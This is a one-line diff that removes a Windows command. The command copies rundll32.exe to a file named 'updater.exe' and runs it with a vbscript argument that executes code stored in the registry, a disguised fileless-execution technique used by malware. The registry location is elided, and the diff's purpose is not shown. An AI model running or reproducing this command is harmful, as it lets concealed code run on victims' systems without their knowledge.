@@ -1,1 +1,0 @@
-copy rundll32.exe updater.exe && updater.exe vbscript:"Execute(RegRead('...')); window.close;"
